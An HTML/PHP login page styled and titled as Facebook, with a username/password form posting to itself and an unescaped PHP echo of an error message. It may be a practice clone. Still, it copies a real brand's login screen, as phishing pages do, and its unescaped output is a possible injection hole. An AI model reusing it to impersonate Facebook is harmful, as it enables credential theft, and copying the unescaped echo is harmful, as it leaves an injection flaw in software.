<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 360px;
            width: 100%;
            padding: 40px;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            color: #1877f2;
            font-size: 24px;
            margin-bottom: 30px;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s ease;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #1877f2;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #166fe5;
        }

        .error-message {
            color: #ff0000;
            font-size: 14px;
            margin-top: 20px;
        }

        p {
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }

        a {
            text-decoration: none;
            color: #1877f2;
            transition: color 0.3s ease;
        }

        a:hover {
            color: #166fe5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Facebook</h1>
        <form method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button>Log In</button>
        </form>
        <p>Don't have an account? <a href="/register">Sign Up!</a></p>
        <!-- Display error message -->
        <?= $error ? '<p class="error-message">' . $error . '</p>' : null ?>
    </div>
</body>
</html>
